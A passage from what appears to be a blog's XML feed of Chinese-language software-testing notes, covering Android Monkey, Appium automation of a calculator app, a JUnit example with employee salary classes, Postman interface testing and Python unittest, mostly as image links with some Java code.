style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484538246.png" alt="1615484538246" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615486792982.png" alt="1615486792982" style="zoom: 67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615486953589.png" alt="1615486953589"></p><h5 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615487083624.png" alt="1615487083624"></p><blockquote><p>—pct</p></blockquote><p>monkey命令的参数,没有特别强制性的顺序,可以按照monkey命令的帮助列表的参数顺序记忆和使用.</p><h5 id="Monkey异常log分析"><a href="#Monkey异常log分析" class="headerlink" title="Monkey异常log分析"></a>Monkey异常log分析</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615487991940.png" alt="1615487991940"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615488289973.png" alt="1615488289973" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615488415636.png" alt="1615488415636" style="zoom:50%;"></p><h1 id="Appium"><a href="#Appium" class="headerlink" title="Appium"></a>Appium</h1><blockquote><p><a href="https://github.com/appium/appium-desktop/releases/tag/v1.20.2" target="_blank" rel="noopener">https://github.com/appium/appium-desktop/releases/tag/v1.20.2</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615557202275.png" alt="1615557202275" style="zoom: 33%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558307389.png" alt="1615558307389" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558370562.png" alt="1615558370562" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558953951.png" alt="1615558953951" style="zoom:50%;"></p><h2 id="元素识别"><a href="#元素识别" class="headerlink" title="元素识别"></a>元素识别</h2><blockquote><p>使用ADT环境中的sdk目录下,tools目录中的uiautomatorviewer.bat</p></blockquote><p>启动uiautomatorviewer.bat</p><p>点击device Screenshot</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615560081753.png" alt="1615560081753"></p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615560132106.png" alt="1615560132106" style="zoom:50%;"></p><h5 id="模拟键盘手机操作"><a href="#模拟键盘手机操作" class="headerlink" title="模拟键盘手机操作"></a>模拟键盘手机操作</h5><blockquote><p>输入操作: sendkeys()</p><p>点击操作: click()</p></blockquote><h5 id="模拟手势操作"><a href="#模拟手势操作" class="headerlink" title="模拟手势操作"></a>模拟手势操作</h5><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615563279179.png" alt="1615563279179" style="zoom:50%;"></p></blockquote><h5 id="移动设备相关操作"><a href="#移动设备相关操作" class="headerlink" title="移动设备相关操作"></a>移动设备相关操作</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615563684414.png" alt="1615563684414" style="zoom: 67%;"></p><h2 id="Appium脚本编写"><a href="#Appium脚本编写" class="headerlink" title="Appium脚本编写"></a>Appium脚本编写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAppium</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//定义DesiredCapabilities对象</span></span><br><span class="line">        DesiredCapabilities dc = <span class="keyword">new</span> DesiredCapabilities();</span><br><span class="line">        <span class="comment">//设定DesiredCapabilities的属性</span></span><br><span class="line">        dc.setCapability(<span class="string">"deviceName"</span>,<span class="string">"127.0.0.1:56001"</span>);<span class="comment">//adb命令查出的设备的编号</span></span><br><span class="line">        dc.setCapability(<span class="string">"automationName"</span>,<span class="string">"Appium"</span>);<span class="comment">//设置自动化测试工具名称</span></span><br><span class="line">        dc.setCapability(<span class="string">"platformName"</span>,<span class="string">"Android"</span>);<span class="comment">//设置平台系统名称</span></span><br><span class="line">        dc.setCapability(<span class="string">"platformVersion"</span>,<span class="string">"4.4.4"</span>);<span class="comment">//设置Android系统版本号</span></span><br><span class="line">        dc.setCapability(<span class="string">"appPackage"</span>,<span class="string">"com.youba.calculate"</span>);<span class="comment">//设置目标app包名</span></span><br><span class="line">        dc.setCapability(<span class="string">"appActivity"</span>,<span class="string">".MainActivity"</span>);<span class="comment">//设置目标app的启动界面</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * url:指的是本地appium服务的IP地址及对应的端口号(appium的默认端口号是4723)</span></span><br><span class="line"><span class="comment">        * 通过该地址可以使appium连接Android设备</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * Capabilities:就是DesiredCapabilities对象</span></span><br><span class="line"><span class="comment">        **/</span></span><br><span class="line">        <span class="comment">//定义appium驱动对象 打开本地app驱动(appium)</span></span><br><span class="line">        AppiumDriver appd = <span class="keyword">new</span> AppiumDriver(<span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1/wd/hub"</span>),dc);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//写脚本,让计算器计算54+68</span></span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_five"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_four"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_plus"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_six"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_eight"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_equal"</span>)).click();</span><br><span class="line">        </span><br><span class="line">        appd.closeApp();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Junit"><a href="#Junit" class="headerlink" title="Junit"></a>Junit</h1><h5 id="一次单元测试用例设计的过程"><a href="#一次单元测试用例设计的过程" class="headerlink" title="一次单元测试用例设计的过程"></a>一次单元测试用例设计的过程</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652206629.png" alt="1615652206629"></p><h4 id="Junit环境"><a href="#Junit环境" class="headerlink" title="Junit环境"></a>Junit环境</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652373832.png" alt="1615652373832"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652610537.png" alt="1615652610537"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615653557718.png" alt="1615653557718"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615662647821.png" alt="1615662647821"></p><h2 id="编写测试"><a href="#编写测试" class="headerlink" title="编写测试"></a>编写测试</h2><p>在这里你将会看到一个应用 POJO 类，Business logic 类和在 test runner 中运行的 test 类的 JUnit 测试的例子。</p><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>EmployeeDetails.java</strong> 的 POJO 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeDetails</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">double</span> monthlySalary;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the name</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> name the name to set</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the monthlySalary</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getMonthlySalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> monthlySalary;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> monthlySalary the monthlySalary to set</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMonthlySalary</span><span class="params">(<span class="keyword">double</span> monthlySalary)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.monthlySalary = monthlySalary;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the age</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> age the age to set</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>EmployeeDetails</strong> 类被用于</p><ul><li>取得或者设置雇员的姓名的值</li><li>取得或者设置雇员的每月薪水的值</li><li>取得或者设置雇员的年龄的值</li></ul><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>EmpBusinessLogic.java</strong> 的 business logic 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmpBusinessLogic</span> </span>&#123;</span><br><span class="line">   <span class="comment">// Calculate the yearly salary of employee</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">calculateYearlySalary</span><span class="params">(EmployeeDetails employeeDetails)</span></span>&#123;</span><br><span class="line">      <span class="keyword">double</span> yearlySalary=<span class="number">0</span>;</span><br><span class="line">      yearlySalary = employeeDetails.getMonthlySalary() * <span class="number">12</span>;</span><br><span class="line">      <span class="keyword">return</span> yearlySalary;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Calculate the appraisal amount of employee</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">calculateAppraisal</span><span class="params">(EmployeeDetails employeeDetails)</span></span>&#123;</span><br><span class="line">      <span class="keyword">double</span> appraisal=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span>(employeeDetails.getMonthlySalary() &lt; <span class="number">10000</span>)&#123;</span><br><span class="line">         appraisal = <span class="number">500</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         appraisal = <span class="number">1000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> appraisal;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>EmpBusinessLogic</strong> 类被用来计算</p><ul><li>雇员每年的薪水</li><li>雇员的评估金额</li></ul><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>TestEmployeeDetails.java</strong> 的准备被测试的测试案例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.Assert.assertEquals;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestEmployeeDetails</span> </span>&#123;</span><br><span class="line">   EmpBusinessLogic empBusinessLogic =<span class="keyword">new</span> EmpBusinessLogic();</span><br><span class="line">   EmployeeDetails employee = <span class="keyword">new</span> EmployeeDetails();</span><br><span class="line"></span><br><span class="line">   <span class="comment">//test to check appraisal</span></span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCalculateAppriasal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      employee.setName(<span class="string">"Rajeev"</span>);</span><br><span class="line">      employee.setAge(<span class="number">25</span>);</span><br><span class="line">      employee.setMonthlySalary(<span class="number">8000</span>);</span><br><span class="line">      <span class="keyword">double</span> appraisal= empBusinessLogic.calculateAppraisal(employee);</span><br><span class="line">      assertEquals(<span class="number">500</span>, appraisal, <span class="number">0.0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// test to check yearly salary</span></span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCalculateYearlySalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      employee.setName(<span class="string">"Rajeev"</span>);</span><br><span class="line">      employee.setAge(<span class="number">25</span>);</span><br><span class="line">      employee.setMonthlySalary(<span class="number">8000</span>);</span><br><span class="line">      <span class="keyword">double</span> salary= empBusinessLogic.calculateYearlySalary(employee);</span><br><span class="line">      assertEquals(<span class="number">96000</span>, salary, <span class="number">0.0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>TestEmployeeDetails</strong> 是用来测试 <strong>EmpBusinessLogic</strong> 类的方法的，它</p><ul><li>测试雇员的每年的薪水</li><li>测试雇员的评估金额</li></ul><p>现在让我们在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>TestRunner.java</strong> 的类来执行测试案例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.runner.JUnitCore;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.Result;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.notification.Failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRunner</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      Result result = JUnitCore.runClasses(TestEmployeeDetails<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">      <span class="keyword">for</span> (Failure failure : result.getFailures()) &#123;</span><br><span class="line">         System.out.println(failure.toString());</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(result.wasSuccessful());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用javac编译 Test case 和 Test Runner 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\JUNIT_WORKSPACE&gt;javac EmployeeDetails.java </span><br><span class="line">EmpBusinessLogic.java TestEmployeeDetails.java TestRunner.java</span><br></pre></td></tr></table></figure><p>现在运行将会运行 Test Case 类中定义和提供的测试案例的 Test Runner</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\JUNIT_WORKSPACE&gt;java TestRunner</span><br></pre></td></tr></table></figure><p>检查运行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">true</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;移动端测试要点&quot;&gt;&lt;a href=&quot;#移动端测试要点&quot; class=&quot;headerlink&quot; title=&quot;移动端测试要点&quot;&gt;&lt;/a&gt;移动端测试要点&lt;/h2&gt;&lt;h3 id=&quot;安装测试、卸载测试&quot;&gt;&lt;a href=&quot;#安装测试、卸载测试&quot; class=&quot;header
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>interface test</title>
    <link href="https://kayleh.top/interface-test/"/>
    <id>https://kayleh.top/interface-test/</id>
    <published>2021-02-20T17:49:12.000Z</published>
    <updated>2021-03-13T18:19:11.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h1><blockquote><p>测试系统内部各个组件间接口,以及系统与外部系统之间的交互点</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613845781204.png" alt="1613845781204" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613928423300.png" alt="1613928423300"></p><h4 id="接口的必要条件"><a href="#接口的必要条件" class="headerlink" title="接口的必要条件"></a>接口的必要条件</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613928573807.png" alt="1613928573807" style="zoom:50%;"></p><h4 id="接口用例设计"><a href="#接口用例设计" class="headerlink" title="接口用例设计"></a>接口用例设计</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613929905199.png" alt="1613929905199" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613930059453.png" alt="1613930059453"></p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614016580698.png" alt="1614016580698" style="zoom: 33%;"></p><h5 id="HTTP响应状态码分类"><a href="#HTTP响应状态码分类" class="headerlink" title="HTTP响应状态码分类"></a>HTTP响应状态码分类</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614100489562.png" alt="1614100489562" style="zoom:50%;"></p><h1 id="POSTMAN"><a href="#POSTMAN" class="headerlink" title="POSTMAN"></a>POSTMAN</h1><h4 id="发送不带参数的GET请求"><a href="#发送不带参数的GET请求" class="headerlink" title="发送不带参数的GET请求"></a>发送不带参数的GET请求</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614103022980.png" alt="1614103022980"></p><h4 id="发送带参数的GET请求"><a href="#发送带参数的GET请求" class="headerlink" title="发送带参数的GET请求"></a>发送带参数的GET请求</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614102472739.png" alt="1614102472739"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614103130379.png" alt="1614103130379"></p><h4 id="参数化运行"><a href="#参数化运行" class="headerlink" title="参数化运行"></a>参数化运行</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614450840486.png" alt="1614450840486"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614276217035.png" alt="1614276217035" style="zoom: 67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614276280706.png" alt="1614276280706" style="zoom:67%;"></p><p>csv文件</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614276076934.png" alt="1614276076934" style="zoom: 50%;"></p><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><h1 id="Postman中的断言"><a href="#Postman中的断言" class="headerlink" title="Postman中的断言"></a>Postman中的断言</h1><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614450747385.png" alt="1614450747385"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614451204413.png" alt="1614451204413"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614451174084.png" alt="1614451174084"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614710982803.png" alt="1614710982803"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614711029433.png" alt="1614711029433"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614711672676.png" alt="1614711672676"></p><p>450</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;接口测试&quot;&gt;&lt;a href=&quot;#接口测试&quot; class=&quot;headerlink&quot; title=&quot;接口测试&quot;&gt;&lt;/a&gt;接口测试&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;测试系统内部各个组件间接口,以及系统与外部系统之间的交互点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Unitest framework</title>
    <link href="https://kayleh.top/Unitest-framework/"/>
    <id>https://kayleh.top/Unitest-framework/</id>
    <published>2021-02-12T16:00:57.000Z</published>
    <updated>2021-03-13T18:17:48.953Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613147342997.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613147496034.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613149415607.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613149552674.png" alt></p><h4 id="多条测试用例"><a href="#多条测试用例" class="headerlink" title="多条测试用例"></a>多条测试用例</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613149845499.png" alt></p><h4 id="注解方法"><a href="#注解方法" class="headerlink" title="注解方法"></a>注解方法</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613199579426.png" alt="1613199579426"></p><h4 id="五个方法"><a href="#五个方法" class="headerlink" title="五个方法"></a>五个方法</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613199693463.png" alt="1613199693463"></p><h4 id="测试用例testcase"><a href="#测试用例testcase" class="headerlink" title="测试用例testcase"></a>测试用例testcase</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613201703588.png" alt="1613201703588"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613202112317.png" alt="1613202112317"></p><h4 id="测试集合testsuite"><a href="#测试集合testsuite" class="headerlink" title="测试集合testsuite"></a>测试集合testsuite</h4><h5 id="追加单个测试对象"><a href="#追加单个测试对象" class="headerlink" title="追加单个测试对象"></a>追加单个测试对象</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613207825662.png" alt="1613207825662"></p><blockquote><p>print(re.__dict__)</p></blockquote><h5 id="追加多个测试对象"><a href="#追加多个测试对象" class="headerlink" title="追加多个测试对象"></a>追加多个测试对象</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613209390861.png" alt="1613209390861"></p><h4 id="TestLoder"><a href="#TestLoder" class="headerlink" title="TestLoder"></a>TestLoder</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613231860846.png" alt="1613231860846"></p><p>第一个参数path：指定存放测试用例的目录（单元测试用例，用unittest框架写的测试用例）</p><p>第二个参数pattern：指定匹配规则</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613233980464.png" alt="1613233980464"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613234000816.png" alt="1613234000816"></p><h4 id="TestRunner"><a href="#TestRunner" class="headerlink" title="TestRunner"></a>TestRunner</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613318481043.png" alt="1613318481043"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613319975732.png" alt="1613319975732"></p><h5 id="状态1"><a href="#状态1" class="headerlink" title="状态1"></a>状态1</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613320910898.png" alt="1613320910898"></p><h5 id="状态2（大于1即可）详细报告"><a href="#状态2（大于1即可）详细报告" class="headerlink" title="状态2（大于1即可）详细报告"></a>状态2（大于1即可）详细报告</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613320887518.png" alt="1613320887518"></p><h5 id><a href="#" class="headerlink" title></a><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613321695363.png" alt="1613321695363"></h5><h5 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613382483121.png" alt="1613382483121"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 